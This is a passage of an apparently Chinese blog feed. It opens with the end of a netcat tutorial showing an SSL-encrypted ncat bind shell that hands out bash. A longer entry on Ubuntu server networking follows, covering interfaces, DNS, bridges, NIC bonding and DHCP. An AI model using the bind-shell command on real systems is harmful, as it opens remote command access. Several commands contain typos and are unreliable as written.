ssl加密</span></span><br><span class="line">A:  ncat -c bash -allow 192.168.1.20 -vnl 3333 --ssl</span><br><span class="line">B:  ncat -nv 192.168.1.19 3333 --ssl      <span class="comment">#攻击端</span></span><br></pre></td></tr></table></figure></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>… …</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;netcat使用&quot;&gt;&lt;a href=&quot;#netcat使用&quot; class=&quot;headerlink&quot; title=&quot;netcat使用&quot;&gt;&lt;/a&gt;netcat使用&lt;/h1&gt;&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="nc" scheme="http://www.xpshuai.cn/tags/nc/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu server-网络相关知识</title>
    <link href="http://www.xpshuai.cn/ubuntu%20server-%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/"/>
    <id>http://www.xpshuai.cn/ubuntu server-网络相关知识/</id>
    <published>2020-03-08T09:48:37.000Z</published>
    <updated>2020-03-08T10:26:46.264Z</updated>
    
    <content type="html"><![CDATA[<h2 id="网络原理"><a href="#网络原理" class="headerlink" title="网络原理"></a>网络原理</h2><p><img src="/ubuntu server-网络相关知识/20200214100233476_240785919.png" alt></p><p><code>ping 127.0.0.1</code> 如果能通，说明本机的TCP/IP协议已经配置成功啦<br><code>arping</code></p><h2 id="网卡配置"><a href="#网卡配置" class="headerlink" title="网卡配置"></a>网卡配置</h2><h6 id="网卡接口"><a href="#网卡接口" class="headerlink" title="网卡接口"></a>网卡接口</h6><p>-enp2s0 (最近使用)、eth0   （以前这么使用）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#wl 开头的是无线网卡</span><br><span class="line"></span><br><span class="line"># ifconfig 命令</span><br><span class="line"># 查看所有网卡</span><br><span class="line">ifconfig -a</span><br><span class="line">    字段意义：MTU,发包，收包，`collisions`发生多少次冲突</span><br><span class="line"></span><br><span class="line"># ip 命令</span><br><span class="line"> ip link     # 查看所有网卡和信息</span><br><span class="line"> ip address</span><br><span class="line"></span><br><span class="line"># lshw   查看系统硬件命令</span><br><span class="line"># 只查看网卡的命令</span><br><span class="line">sudo lshw -class network</span><br></pre></td></tr></table></figure><h6 id="管理网卡"><a href="#管理网卡" class="headerlink" title="管理网卡"></a>管理网卡</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看网卡参数</span></span><br><span class="line">sud ethtool enp0s3</span><br><span class="line"></span><br><span class="line"><span class="comment"># -s   配置 ： speed 速度 半双工 </span></span><br><span class="line">sud ethtool -s duplex half | full speed 1000</span><br></pre></td></tr></table></figure><h6 id="网络基本设置"><a href="#网络基本设置" class="headerlink" title="网络基本设置"></a>网络基本设置</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 临时设置IP地址</span></span><br><span class="line">sudo ifconfig eth0 10.0.0.00 netmask 255.255.255.0</span><br><span class="line"><span class="comment"># 24位掩码</span></span><br><span class="line">sudo ifconfig eth0 10.0.0.100/24</span><br><span class="line"><span class="comment"># 设置网关 gw</span></span><br><span class="line">sudo route add default gw 10.0.0.1 eth0</span><br><span class="line"><span class="comment"># 网段路由 add-net   （静态路由：去哪个网段，应该怎么转发）</span></span><br><span class="line">sudo route add-net 0.0.0.0 netmask 0.0.0.0 gw 1.1.1.1</span><br><span class="line"><span class="comment"># 主机路由 add-host    </span></span><br><span class="line">sudo route add-host 2.2.2.2 gw 1.1.1.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清除网卡配置</span></span><br><span class="line">ip addr fulsh eth0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向网络中要一个IP</span></span><br><span class="line">sudo dhcpclient</span><br><span class="line"></span><br><span class="line"><span class="comment"># 禁用网卡</span></span><br><span class="line">sudo ifconfig eth0 down</span><br><span class="line"><span class="comment"># 启用网卡</span></span><br><span class="line">sudo ifconfig eth0 up</span><br><span class="line"><span class="comment"># 重启网络服务</span></span><br><span class="line">sudo systemctrl restart networking.service</span><br></pre></td></tr></table></figure><h6 id="网卡配置文件"><a href="#网卡配置文件" class="headerlink" title="网卡配置文件"></a>网卡配置文件</h6><p><code>/etc/nwtwork/interfaces</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">文件字段：</span><br><span class="line">iface 网卡name inet 网络配置（loopback/dhcp/static）</span><br><span class="line"></span><br><span class="line">    sudo eth0</span><br><span class="line">    iface eth0 inet static|DHCP</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pre-up 系统启动中(网卡运行前)  设置为1000M，全双工</span></span><br><span class="line">    pre-up/sbin/ethtool -s eth0 speed 1000 duplex full</span><br></pre></td></tr></table></figure></p><h6 id="动态获取IP地址"><a href="#动态获取IP地址" class="headerlink" title="动态获取IP地址"></a>动态获取IP地址</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo vim /etc/network/interfaces</span></span><br><span class="line">auto eth0</span><br><span class="line">iface inet dhcp</span><br></pre></td></tr></table></figure><h6 id="静态IP地址"><a href="#静态IP地址" class="headerlink" title="静态IP地址"></a>静态IP地址</h6><p>一般服务器是静态的IP<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo vim /etc/network/interfaces</span></span><br><span class="line">auto eth0</span><br><span class="line">iface inet static</span><br><span class="line">    address 192.168.123.9</span><br><span class="line">    netmask 255.255.255.0        <span class="comment"># 掩码</span></span><br><span class="line">    gateway 192.168.123.1        <span class="comment"># 网关</span></span><br><span class="line">    dns-nameservers 192.168.123.1 202.99.96.68   <span class="comment"># 一般dns地址写俩</span></span><br><span class="line">    <span class="comment"># 上面是基本配置, 下面是额外其他配置项</span></span><br><span class="line">    broadcast 192.168.123.255   <span class="comment"># 网段的广播地址</span></span><br><span class="line">    <span class="comment"># dns-search  abc.com  # 如果属于某个dns域,就默认去找这个</span></span><br><span class="line">    up route add -net 172.16.0.0/24  gw 192.168.23.1 eth0   <span class="comment"># 开机之后,添加一个网段(要指定具体网关)</span></span><br><span class="line">    mtu 1460   <span class="comment"># 指定MTU 字节</span></span><br><span class="line">    <span class="comment"># hwaddress 00:11:22:33:44:55   # 指定硬件mac地址</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 刷新,重启网络, 配置文件的网络生效(实在不行就重启计算机)</span></span><br><span class="line">sudo ip address fulsh eth0 </span><br><span class="line">sudo systemctrl restart networking.service</span><br></pre></td></tr></table></figure></p><p><img src="/ubuntu server-网络相关知识/20200214114820323_1273216811.png"><br>指定路由<br>清除信息<br>ip addr flush ens32</p><blockquote><p>Note： VmWare对网络的支持要好于VirtualBox(比如有些网络的配置可能有限制)</p></blockquote><h2 id="DNS配置"><a href="#DNS配置" class="headerlink" title="DNS配置"></a>DNS配置</h2><h6 id="DNS配置文件"><a href="#DNS配置文件" class="headerlink" title="DNS配置文件"></a>DNS配置文件</h6><p><code>/etc/resolve.conf</code>    </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/etc/resolve.conf    <span class="comment"># DNS设置（软连接）</span></span><br><span class="line">格式:</span><br><span class="line">    nameserver 114.114.114.114</span><br><span class="line">    nameserver 127.0.0.53</span><br><span class="line">    options edns0</span><br><span class="line">    search www.tendawifi.com</span><br></pre></td></tr></table></figure><h6 id="主机名解析"><a href="#主机名解析" class="headerlink" title="主机名解析"></a>主机名解析</h6><p>1.配置文件 <code>/etc/hosts</code>    优先级别<code>高</code>于resolve.conf里面的dns服务器的信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ip 和名称做解析</span></span><br><span class="line">127.0.0.1 localhost</span><br><span class="line">192.168.0.111 www.qq.com</span><br><span class="line"><span class="comment"># 现在这里找映射，有的话就不去resolve里面找了</span></span><br></pre></td></tr></table></figure></p><p>2.配置文件 <code>/etc/nsswitch.conf</code>        名称解析顺序配置文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 按照优先级先后排序来解析  （前面的不满足，才调用后面的）</span></span><br><span class="line">- files        /etc/hosts</span><br><span class="line">- Resolve        全称systemd-resolved.service(缓存、localhost、本机名)   （默认安装）</span><br><span class="line">- [NOTFOUND=<span class="built_in">return</span>]        结果即权威  （正则表达式）  （当找不给我到的之后，返回）</span><br><span class="line">- dns                    dns服务器（resolve文件配置的那些）</span><br><span class="line">- mdns4_minimal            MulticastDNS(多播dns服务)     现在很多dns厂家用的就是多播dns服务</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">hosts:          files mdns4_minimal [NOTFOUND=<span class="built_in">return</span>] dns myhostname</span><br></pre></td></tr></table></figure></p><blockquote><p>关于解析优先级：有的攻击者会修改你hosts文件映射到自己的恶意网址，此时如果把dns的顺序放到hosts前面，他就利用不成了</p></blockquote><h6 id="查看路由"><a href="#查看路由" class="headerlink" title="查看路由"></a>查看路由</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 路由信息</span></span><br><span class="line">route -n</span><br><span class="line"></span><br><span class="line">netstat -nr</span><br></pre></td></tr></table></figure><h2 id="网桥配置"><a href="#网桥配置" class="headerlink" title="网桥配置"></a>网桥配置</h2><blockquote><p>把服务器当交换机用实在是大材小用<br>把多个以太网段以上层透明的方式连接在一起</p></blockquote><p><strong>应用场景：</strong><br>1.可做防火墙<br>2.可以做虚拟机的服务器（搭建云平台，进行虚拟化的时候）<br>3.桥接有线网与无线网（比如我的笔记本：连接网线访问互联网，另外让别人通过我的电脑无线上网，相当于一个AP）<br>4.链路荣誉容错（需启用STP）<br>5.通过网桥管理工具实现 <code>bridge-utils</code></p><p><img src="/ubuntu server-网络相关知识/20200218132001375_1018333933.png"></p><h6 id="在ubunut搭建网桥"><a href="#在ubunut搭建网桥" class="headerlink" title="在ubunut搭建网桥"></a>在ubunut搭建网桥</h6><p>在虚拟机添加2块网卡(一块NAT，另一块随便)</p><p><strong>安装网桥管理包：</strong><br><code>sudo apt install bridge-utils</code></p><p><strong>临时配置网桥：</strong><br>命令： <code>btctl</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo btctl addr br0     <span class="comment"># 添加一个网桥的网卡接口</span></span><br><span class="line">sudo btctl addif br0 eth0 eth1  <span class="comment"># 往网桥接口添加2块网卡</span></span><br><span class="line"><span class="comment"># sudo ifconfig eth0 down   # 把网卡down掉</span></span><br><span class="line">sudo ifconfig eth0 0.0.0.0 up    <span class="comment"># 2者的ip变没了</span></span><br><span class="line">sudo ifconfig eth1 0.0.0.0 up</span><br><span class="line">sudo ifconfig br0 1.1.1.1/24 up   <span class="comment"># 手动配置网桥网卡的ip并up</span></span><br><span class="line">sudo dhclient br0    <span class="comment"># 或者 dhcp自动获取网桥网卡的ip地址</span></span><br><span class="line">sudo route add default gw 1.1.1.10    <span class="comment"># 添加一个网关，就可以访问外网了</span></span><br></pre></td></tr></table></figure></p><p><strong>持久配置网桥：</strong><br>修改配置文件： <code>/etc/network/interfaces</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">auto eth0</span><br><span class="line">iface eth0 inet manual</span><br><span class="line"></span><br><span class="line">auto eth1</span><br><span class="line">iface eth1 inet manual</span><br><span class="line"></span><br><span class="line">auto br0</span><br><span class="line">iface br0 inet dhcp   <span class="comment"># dncp  ， 也可以static，下面手动配置address，netmask和gateway</span></span><br><span class="line">bridge_ports eth0 eth1  <span class="comment"># 加入网卡</span></span><br><span class="line">bridge_stop off   <span class="comment">#关闭生成树 ,也可以 on开启成树，参与生成树计算</span></span><br></pre></td></tr></table></figure></p><p>修改保存，然后 重启网络服务/重启服务器</p><p><strong>查看网桥运行状态</strong><br><code>sudo brctl show</code><br><strong>查看mac情况</strong><br><code>sudo brctl showmacs br0</code><br><strong>查看生成树情况</strong><br><code>sudo brctl showstp br0</code></p><h2 id="网卡绑定-经常使用"><a href="#网卡绑定-经常使用" class="headerlink" title="网卡绑定   (经常使用)"></a>网卡绑定   (经常使用)</h2><blockquote><p>还记得小时候这段一把筷子的故事吗</p></blockquote><p>实现多块网卡的绑定，实现高可用、负载均衡、更大发挥能力</p><h6 id="一些常用称呼："><a href="#一些常用称呼：" class="headerlink" title="一些常用称呼："></a>一些常用称呼：</h6><p>Bonding == Port Trunking == Link aggregation(链路聚合)  == Team</p><h6 id="目的："><a href="#目的：" class="headerlink" title="目的："></a>目的：</h6><p>将多个物理网卡组合为一个逻辑网卡</p><ul><li>高可用、负载平衡、高吞吐量</li></ul><h4 id="配置："><a href="#配置：" class="headerlink" title="配置："></a>配置：</h4><p>在虚拟机做实验：先给虚拟机添加至少两块网卡<br>1.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">echo</span> bonding &gt;&gt; /etc/modules        <span class="comment"># 添加内核支持</span></span><br><span class="line">sudo modprobe bonding       <span class="comment"># 手动加载内核(临时)， modeprobe加载bonding</span></span><br><span class="line">ifconfig -a    <span class="comment"># 可以看到自动生成了一个bonding0的网卡(但是没有up)</span></span><br><span class="line">sudo systemctl stop networking     </span><br><span class="line"><span class="comment"># 永久配置，文件</span></span><br><span class="line"><span class="comment"># sudo vim /etc/network/interfaces</span></span><br><span class="line">bounding    <span class="comment"># 添加一个模块</span></span><br><span class="line"><span class="comment"># 重启服务</span></span><br><span class="line">sudo systemctl restart networking</span><br></pre></td></tr></table></figure></p><p>2.配置网卡配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># Mode 1 配置</span><br><span class="line"># sudo vim /etc/network/interfaces</span><br><span class="line">auto eth0 </span><br><span class="line">iface eth0 inet manual</span><br><span class="line">bond-master  bond0    # 绑定到哪个bound上</span><br><span class="line">bond-primary  eth0    # 默认做的主的网卡</span><br><span class="line"></span><br><span class="line">auto eth01</span><br><span class="line">iface eth01 inet manual</span><br><span class="line">bond-master  bond0      # 备的网卡，协商要绑定那个</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">auto bond0</span><br><span class="line">iface bond0 inet dhcp   # 让ip地址dhcp； 或者static 手动制定</span><br><span class="line">bond-mode   1    # 绑定模式   active-backup</span><br><span class="line">bond-miimon 100    # 故障检测间隔： 100ms</span><br><span class="line">bond-slaves none         # 指定作为的的成员的网卡, 这里写none是因为：加入在自己物理网卡片段里面写了</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line"># 重启服务</span><br><span class="line">sudo systemctl restart networking</span><br></pre></td></tr></table></figure></p><p>PS: 绑定模式<br>bound-mode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1     一个主，一个备(主的故障后才工作)  也叫： active-backup</span><br></pre></td></tr></table></figure></p><h4 id="6种模式"><a href="#6种模式" class="headerlink" title="6种模式"></a>6种模式</h4><h6 id="Mode-0-：-round-robin-轮询"><a href="#Mode-0-：-round-robin-轮询" class="headerlink" title="Mode 0  ： round-robin(轮询)"></a>Mode 0  ： round-robin(轮询)</h6><ul><li>网络流量（数据包） 顺序平均分配给Bond中所有物理网卡（可以同时使用三个网卡发送和接收数据）</li><li>高可用（容错，一个坏了，另一个网卡接管）、负载均衡（多个网卡，单独是，就是拥有了多G的带宽）</li></ul><h6 id="Mode-1-ative-backup"><a href="#Mode-1-ative-backup" class="headerlink" title="Mode 1 : ative-backup"></a>Mode 1 : ative-backup</h6><ul><li>Bond中只有一个网卡Active， 其他网卡全部Stanby（效率并不是很高）</li><li>对外只有一个网卡的MAC地址可见</li><li>高可用<br>实现不了负载均衡，有多个接口也没用</li></ul><h6 id="Mode-2-balance-XOR"><a href="#Mode-2-balance-XOR" class="headerlink" title="Mode 2:  balance-XOR"></a>Mode 2:  balance-XOR</h6><ul><li>根据源目的MAC/IP/Port进行计算，确定从哪个网卡发出（性能优于Mode0）</li><li>高可用，负载均衡</li></ul><p>（XOR — &gt; 异或）<br>只要不出现故障，不改变mac地址，第一次使用的第一个物理网卡进行的通信，以后所有的通信都是继续使用第一个物理网卡<br>流量不是平均的</p><h6 id="Mode-3-broadcast"><a href="#Mode-3-broadcast" class="headerlink" title="Mode 3   broadcast"></a>Mode 3   broadcast</h6><ul><li>发包广播给Bond中所有网卡，提供最短的故障恢复时间，应用连接不中断</li><li>高可用</li></ul><h6 id="Mode-4-802-3ad（Dynamic-link-aggregation）"><a href="#Mode-4-802-3ad（Dynamic-link-aggregation）" class="headerlink" title="Mode 4   802.3ad（Dynamic link aggregation）"></a>Mode 4   802.3ad（Dynamic link aggregation）</h6><ul><li>链路聚合LACP组内的网卡使用相同速率、双工设置</li><li>要求：计算机安装ethtool；交换机支持IEEE802.3ad标准，并进行额外配置</li><li>高可用、负载均衡</li></ul><h6 id="Mode-5-balance-tlb-（Adaptive-transmit-load-balancing）"><a href="#Mode-5-balance-tlb-（Adaptive-transmit-load-balancing）" class="headerlink" title="Mode 5    balance-tlb （Adaptive transmit load balancing）"></a>Mode 5    balance-tlb （Adaptive transmit load balancing）</h6><ul><li>隧道绑定不需要上连交换机额外配置，根据网卡负载出站负载均衡</li><li>高可用、负载均衡</li></ul><h6 id="Mode-6-balance-alb-Adaptive-load-balance"><a href="#Mode-6-balance-alb-Adaptive-load-balance" class="headerlink" title="Mode 6:   balance-alb (Adaptive load balance)"></a>Mode 6:   balance-alb (Adaptive load balance)</h6><ul><li>Mode 5 + balance-rlb (入站流量负载均衡)<ul><li>Bond驱动拦截本机的ARP响应包，使用不同网卡硬件MAC替换源MAC</li><li>不同的对端使用不同的服务器MAC地址，实现入站负载均衡<ul><li>不需要上连交换机额外配置</li></ul></li></ul></li></ul><h6 id="查看bond端口和状态"><a href="#查看bond端口和状态" class="headerlink" title="查看bond端口和状态"></a>查看bond端口和状态</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/net/bonding/bond0</span><br></pre></td></tr></table></figure><h6 id="Model-4-配置"><a href="#Model-4-配置" class="headerlink" title="Model 4 配置"></a>Model 4 配置</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo vim /etc/network/interfaces</span></span><br><span class="line">auto eth0     <span class="comment"># 其他物理网卡配置项同</span></span><br><span class="line">iface eth0 inet manual</span><br><span class="line">bond-master  boud0    <span class="comment"># 绑定到哪个bound上</span></span><br><span class="line"></span><br><span class="line">auto bon</span><br><span class="line">d0</span><br><span class="line">iface bond0 inet dhcp   <span class="comment"># 让ip地址dhcp； 或者static 手动制定</span></span><br><span class="line">bond-mode 4    <span class="comment"># 绑定模式   active-backup</span></span><br><span class="line">bond-miimon 100    <span class="comment"># 故障检测间隔： 100ms</span></span><br><span class="line">bond-lacp-rate 1         <span class="comment"># 每1s发送LACPDU（默认为0，即30s）</span></span><br><span class="line">bond-slaves eth0 eth1         <span class="comment"># 指定作为的的成员的网卡</span></span><br></pre></td></tr></table></figure><h2 id="DHCP服务"><a href="#DHCP服务" class="headerlink" title="DHCP服务"></a>DHCP服务</h2><p>通常给客户端自动分配IP地址</p><h6 id="Dynamic-Host-Configuration-Protocol"><a href="#Dynamic-Host-Configuration-Protocol" class="headerlink" title="Dynamic Host Configuration Protocol"></a>Dynamic Host Configuration Protocol</h6><ul><li>透明的配置网络参数</li><li>IP/掩码、网关、DNS、域名、时间服务器、打印服务器(常用的参数是前三个)</li><li>通过地址租约循环使用IP地址（有租约期，循环利用）</li><li>基于UDP， 标准使用 端口： 67(服务端)，68(客户端)</li></ul><p>ps: 一般企业，dhcp都在核心交换机上，只有当企业网络非常大复杂时候，才会单独使用一个服务器来提供dhcp服务</p><p><strong>请求和分配步骤：</strong><br>1.客户端发生第一个广播(二层，因为此时还没有ip)，数据包：<code>dhcp discover</code><br>2.dhcp服务器回复数据包<code>dhcp offer</code><br>3.客户端就再发一个广播包<code>dhcp request</code><br>4.服务器端发送数据包<code>ack</code>， 包含ip等参数，标记这个ip为已分配</p><h6 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h6><p>1.在vmware上，打开虚拟网络设置，以vmnet8为例，关闭vmware自带的dhcp服务（如果同时有两台dhcp服务:使用响应快的服务提供的ip），将这台虚拟机使用nat，<br>让其他虚拟机都使用这台虚拟机的dhcp服务，把这个虚拟机修改为静态ip, 修改配置文件<code>/etc/network/inertface</code>到vmnet8的网段，<code>sudo ip addr fulsh eth0</code>清除原来配置，重启网络服务</p><p>2.安装dhcp服务的软件包<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里用的isc的</span></span><br><span class="line">sudo apt install isc-dhcp-server</span><br></pre></td></tr></table></figure></p><p>3.配置dhcp服务</p><blockquote><p>Note：能不安装的服务和软件就不要安装，反非必须，就不启用（缩小攻击面）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##1.先修改配置文件1</span></span><br><span class="line"><span class="comment">#sudo vim /etc/default/isc-dhcp-server   # 指定启动DHCP服务的网卡</span></span><br><span class="line">    INTERFACE=<span class="string">"eth0"</span>   <span class="comment"># 要启动shcp的网卡name(一般是针对内网的那一块网卡)，可以多个网卡（空格隔开）</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">##2.再修改主配置文件（指定地址池和选项） </span></span><br><span class="line"><span class="comment">#sudo vim /etc/dhcp/dhcpd.conf       </span></span><br><span class="line"><span class="comment">#option只对dhcp的作用域起效；其他的很对整个服务器起效</span></span><br><span class="line"><span class="comment">#一致的配置写在文件起始位置，其他的个性的单独设置在各个网段的位置</span></span><br><span class="line">default-lease-time 600;  <span class="comment">#租约期限， 单位：s</span></span><br><span class="line">max-lease-time 7200;  <span class="comment">#最大租约期限(到达时间的一半，就刷新使用期；如果到达最大时间，就重新通过dhcp获取)</span></span><br><span class="line">authoritative;   <span class="comment">#启用之后，证明这个是权威的授权dhcp服务器（一般情况下，网络中如果出现其他的dhcp就不会影响了）</span></span><br><span class="line"><span class="comment">#配置地址池(可以手动写，也可以在原注释的基础上配置) 网段</span></span><br><span class="line">subnet 10.1.8.0 netmask 255.255.255.0 &#123;</span><br><span class="line">    range 10.1.8.100 10.1.8.200;   <span class="comment">#可分配的地址段</span></span><br><span class="line">    option routers 10.1.8.1;  <span class="comment">#网关地址</span></span><br><span class="line">    option domain-name-servers 192.168.1.1,192.168.1.2;  <span class="comment">#dns服务器地址，多个用逗号隔开; 一般配到这里就够了</span></span><br><span class="line">    option ntp-server 1.1.1.1;     <span class="comment">#时间服务器</span></span><br><span class="line">    option domain-name <span class="string">"local.lan"</span>;   <span class="comment">#统一的域名</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">##3.重启服务</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#客户端一些操作</span></span><br><span class="line">ipconfig /all</span><br><span class="line">ipconfig /release   <span class="comment"># 释放这个ip</span></span><br><span class="line">ipconfig /renew    <span class="comment">#重新获取ip</span></span><br></pre></td></tr></table></figure></p></blockquote><p>3.特殊情况(指定某个ip只分配给某台计算机，IP保留)</p><blockquote><p>通过MAC地址来识别<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sudo vim /etc/dhcp/dhcpd.conf       </span></span><br><span class="line"></span><br><span class="line">host yourname &#123;</span><br><span class="line">    hardware ethernet 00:11:22:33:44:55;</span><br><span class="line">    fixed-address 10.1.8.8;   <span class="comment">#尽量用上面地址池以外的地址</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#保存，重启</span></span><br></pre></td></tr></table></figure></p></blockquote><h6 id="日常的维护"><a href="#日常的维护" class="headerlink" title="日常的维护"></a>日常的维护</h6><p>日志与状态查询<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#服务器地址租约结果（可查看分发详细信息）</span></span><br><span class="line">cat /var/lib/dhcp/dhcpd.leases</span><br><span class="line"><span class="comment">#系统日志文件(客户端直接关机不会记录，release的时候会记录)</span></span><br><span class="line">tail -f /var/<span class="built_in">log</span>/syslog</span><br><span class="line"><span class="comment">#查看服务运行状态</span></span><br><span class="line">systemctl status isc-dhcp-server.service</span><br><span class="line"><span class="comment">#客户端来查看获得地址历史(客户端是Linux时)</span></span><br><span class="line">less 